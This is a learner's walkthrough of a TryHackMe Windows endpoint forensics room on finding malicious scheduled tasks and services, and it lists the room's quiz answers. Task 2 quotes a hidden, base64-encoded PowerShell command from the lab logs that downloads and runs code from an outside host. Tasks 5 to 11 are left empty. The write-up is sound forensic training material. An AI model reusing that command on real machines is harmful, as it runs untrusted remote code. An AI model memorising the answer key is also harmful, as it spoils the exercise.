<h1 align="center">Windows Endpoint Investigation<br>Advanced Endpoint Investigation<img width="660px" src="https://github.com/user-attachments/assets/5f257bab-be7b-455e-8d8a-95556bf3e38d"><br>Windows Applications Forensics</h1>

<p align="center"July 1, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{421}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/dc169c77-5e5b-4c1d-9c92-0bb5b74d708"><br></p>
<p align="center"><em>Perform a live analysis on Windows systems, focused on determining the outliers based on known behaviour of scheduled tasks, services, and installed applications.</em>.<br>
It is classified as a medium-level walkthrough.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/windowsapplications">here</a>.</p>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/dcf4bade-0ae5-4e56-bdb0-f834cd9f6ba3"> </p>

<br>
<br>

<h2> Task 1 . Introduction</h2>

<h3 align="left"> Answer the question below</h3>

> 1.1. <em>I have successfully started the virtual machine.</em><br><a id='1.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h2> Task 2 . Introduction</h2>

<h3 align="left"> Answer the questions below</h3>

> 2.1. <em>Who created the malicious scheduled tasks?</em><br><a id='2.1'></a>
>> <strong><code>mike.myers</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/25820ccf-b778-4cb5-be4d-820aed2d82a3)

<br>

> 2.2. <em>Based on the ones discovered from the logs, what URL is accessed by this malicious scheduled task? (format: defanged URL)</em><br><a id='2.2'></a>
>> <strong><code>hxxp[://]hrcbishtek[.]com/a</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/0b0e4cfa-83a1-4a26-ad67-47a84feec3c7)

```bash
-w hidden -enc aQBlAHgAKABpAHcAcgAgAC0AdQBzAGUAYgAgAGgAdAB0AHAAOgAvAC8AaAByAGMAYgBpAHMAaAB0AGUAawAuAGMAbwBtAC8AYQApAA==
```

![image](https://github.com/user-attachments/assets/2afaf7ff-84b1-4a9b-9f14-0e6e93e2c650)

![image](https://github.com/user-attachments/assets/c58dc838-ceed-4adb-803e-24e14ac54d9d)


<br>

> 2.2. <em></em><br><a id='2.3'></a>
>> <strong><code>_____</code></strong><br>
<p></p>

<br>

<h2> Task 3 . Manual Inspection: Scheduled Tasks</h2>

<h3 align="left"> Answer the questions below</h3>

> 3.1. <em>Aside from the scheduled tasks from Windows Event Logs, what does the second malicious scheduled task execute?</em><br><a id='3.1'></a>
>> <strong><code>C:\Users\Public\pagefilerpqy.exe</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/a60b303a-a15f-45f7-8314-4b333762745d)

![image](https://github.com/user-attachments/assets/fa965958-c620-4935-ad5b-8f7d101aaf71)

<br>

> 3.2. <em>Based on Q1, what time does the second malicious task execute daily? (format: HH:MM, e.g. 18:30)</em><br><a id='3.2'></a>
>> <strong><code>17:21</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/082fd214-101b-4cf5-967b-290ea6fed071)

![image](https://github.com/user-attachments/assets/30c63055-6eca-405a-aa2d-21df253ea135)

<br>

<br>

<h2> Task 4 . Manual Inspection II: Services</h2>

<h3 align="left"> Answer the questions below</h3>

> 4.1. <em>Aside from the service determined through logs, what is the full path of the binary executed by the second malicious service?</em><br><a id='4.1'></a>
>> <strong><code></code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/02080d31-5306-46f5-9d73-56d31de36feb)

<br>

> 4.2. <em>What is the last write time of the second malicious service? (format: MM/DD/YYYY HH:MM:SS)</em><br><a id='4.2'></a>
>> <strong><code>03/07/2024 17:53:53</code></strong><br>
<p></p>


<br>

<h2> Task 5 . Dissecting Browser Artefacts I: Mozilla Firefox</h2>

<h2> Task 6 . Dissecting Browser Artefacts II: Google Chrome</h2>

<h2> Task 7. Dissecting Browser Artefacts III: Microsoft Edge</h2>

<h2> Task 8 . Deep-diving on Office Applications I: Microsoft Outlook</h2>

<h2> Task 9 . Deep-diving on Office Applications II: Microsoft Teams</h2>

<h2> Task 10 . Deep-diving on Office Applications III: Microsoft</h2>

<h2> Task 11 . Conclusion</h2>

<br>
<br>


![image](https://github.com/user-attachments/assets/58f9dedc-bd18-4605-b78e-292e23a03075)

![image](https://github.com/user-attachments/assets/90483ff1-e78a-40da-846c-984a6dd6bb08)

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 1, 2025      | 421      |     165ᵗʰ    |      5ᵗʰ     |    2,077ᵗʰ  |     34ᵗʰ   |  112,382 |    819    |     63    |

</div>


![image](https://github.com/user-attachments/assets/afdc58a4-25d1-4e3c-bd31-893e9bb4b8a8)

![image](https://github.com/user-attachments/assets/552c3397-ffc2-4ee1-acf3-f142fb0b23a4)

![image](https://github.com/user-attachments/assets/ffecfd2c-be00-4f57-a24f-e9118cb95a62)

![image](https://github.com/user-attachments/assets/0329da6e-12f9-4326-bce8-d02b019c98a3)
